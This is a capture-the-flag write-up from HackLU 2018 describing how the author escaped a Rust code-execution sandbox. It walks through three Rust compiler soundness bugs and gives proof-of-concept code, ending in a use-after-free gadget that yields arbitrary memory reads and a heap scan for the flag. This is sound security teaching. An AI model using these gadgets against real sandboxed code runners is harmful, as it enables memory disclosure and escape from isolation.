---
title: HackLU 2018 Rusty CodePad
author: Avi Weinstock
date: 2018-10-18
categories: ctf-writeups
---

This is a writeup of the challenge "Rusty CodePad" from the HackLU cybersecurity capture the flag competition in 2018.
I originally posted this writeup at <https://ctftime.org/writeup/11859>

# Writeup

We initially tried submitting safe Rust that used the standard library's File object to read the flag. Sandwiching this in between `println!`'s showed that the process was silently dying after the first print, but before the second print, from which we inferred the existence of the seccomp filter. Attempting to use unsafe code to search the process's own address space was stymied by the presence of `-F unsafe_code` in the build script.

I then tried to find issues on Rust's issue tracker that were tagged "I-unsound", which are compiler bugs known to be able to violate memory safety in "safe" code.

<!--more-->

The first one I tried, <https://github.com/rust-lang/rust/issues/10184>, is an issue with casting a float to an integer and using it to index into an array: due to how LLVM handles float casts, this triggers undefined behavior, leading to LLVM mistakenly thinking that an obscenely large float is in-bounds and optimizing out the bounds check. The issue has a proof of concept in one of the posts:
```
#[inline(never)]
pub fn f(ary: &[u8; 5]) -> &[u8] {
    let idx = 1e100f64 as usize;
    &ary[idx..]
}

fn main() {
    println!("{}", f(&[1; 5])[0xdeadbeef]);
}
```
But unfortunately (for the purposes of exploitation) it panics in debug mode (which codepad uses) because the optimizer isn't invoked, so the bounds check is still there.

The next issue I tried, <https://github.com/rust-lang/rust/issues/27282>, required a bit of work to turn into an arbitrary read. The bug is that it's possible via an interaction of 3 different language features (guard clauses, lambdas, and reborrowing) to change the tag of a value in between the cases of a match statement. This causes an arm of the match statement to be executed with the wrong tag. The initial POC from the thread
```
fn main() {
    match Some(&4) {
        None => {},
        ref mut foo
            if {
                (|| { let bar = foo; bar.take() })();
                false
            } => {},
        Some(s) => println!("{}", *s)
    }
}
```
doesn't allow values to be cast, or arbitrary addresses to be read. If the value were a `Result` instead of an `Option`, this would be easy to weaponise; swapping the tag out on a `Result<A,B>` lets you cast an A to a B. `Result` doesn't have a direct equivalent of `Option::take`, but rewriting it to use a custom sum type and manually implementing `Option::take` gives insight into how to accomplish the cast despite that:
```
enum MyOption { MyNone, MySome(A) }
use MyOption::{MyNone, MySome};

impl MyOption {
    fn take(&mut self) -> Option {
        match ::std::mem::replace(self, MyNone) {
            MyNone => None,
            MySome(x) => Some(x),
        }
    }
}

fn main() {
    match MySome(&4) {
        MyNone => {},
        ref mut foo
            if {
               (|| { let bar = foo; bar.take() })();
               false
           } => {},
        MySome(s) => println!("{}", *s)
    }
}
```
`mem::replace` allows us to swap out the tag just like `Option::take`, and it works on `Result` as well. With this, we can forge a pointer (which is safe since it's not dereferenced as a pointer) to arbitrary memory, cast it to a reference using the bug, and dereference it (since references are guaranteed to point to valid memory in the absence of unsafe code/compiler bugs):
```
fn read_via_27282(addr: usize) -> u8 {
    let mut y = 4;
    let mut x : Result<&mut u8, *mut u8> = Ok(&mut y);
    match x {
        Err(_) => (),
        ref mut foo
            if {
                (|| { let bar = foo; let _err = ::std::mem::replace(bar, Err(addr as _)); })();
                false
            } => (),
        Ok(ref s) => {
            return **s;
        },
    }
    panic!("this is unreachable in release mode, but in debug mode, this gets hit");
}
```
Unfortunately, this also fails to work in debug mode (there's some weird fall-through behaviour instead).

Fortunately, the third issue I looked at, <https://github.com/rust-lang/rust/issues/25860>, does end up working in debug mode. The gadget from the issue has the signature `fn bad<'a, T>(x: &'a T) -> &'static T`, `'a` is an arbitrary lifetime, `'static` is the longest possible lifetime (e.g. the type of stuff in .data, that's never freed). `bad` is operationally the identity, so if you pass it something that gets freed at the end of a block (e.g. any RAII type that internally manages a heap allocation), it still does free it at runtime, but borrowcheck still thinks that the output is live (since it's `&'static` so it lives forever), so it lets you return the freed/dangling value from the block.

This allows us to read arbitrary memory by aliasing a Vec<u8>'s {pointer,capacity,length} fields to a heap-allocated triple of usize's:
```
static UNIT: &'static &'static () = &&();

fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T { v }

fn bad<'a, T>(x: &'a T) -> &'static T {
    let f: fn(_, &'a T) -> &'static T = foo;
    f(UNIT, x)
}

fn inner() -> &'static Vec<u8> {
    let x = Box::new(Vec::new());
    bad(&*x)
}

let x = inner();
let mut y = Box::new((1usize, 2usize, 3usize));
println!("x: {:?} {} {}", x.as_ptr(), x.capacity(), x.len());

let mut r = |addr: usize| { y.0 = addr; x[0] };
```

Concurrently to my testing of the bugs, my teammate glenns found that a sample binary could be downloaded directly from the web interface via `wget https://arcade.fluxfingers.net:1814/cat/target/release/codepad` and reversed it to find that the flag was read into the heap as a pair of u32's, one of which was random, and the other of which was the same random value xor'd with the flag byte.

Combining this knowledge with the arbitrary read via the issue-25860 UAF, we scanned the heap backwards from a fresh allocation to find consecutive words that xor'd to printable ASCII, which yielded the flag.

The complete exploit code is available [on GitHub](https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/80193b18b76822cb1eb1661e91961e11e1641855/hacklu_2018/rustycodepad/exploit_rustycodepad.rs).


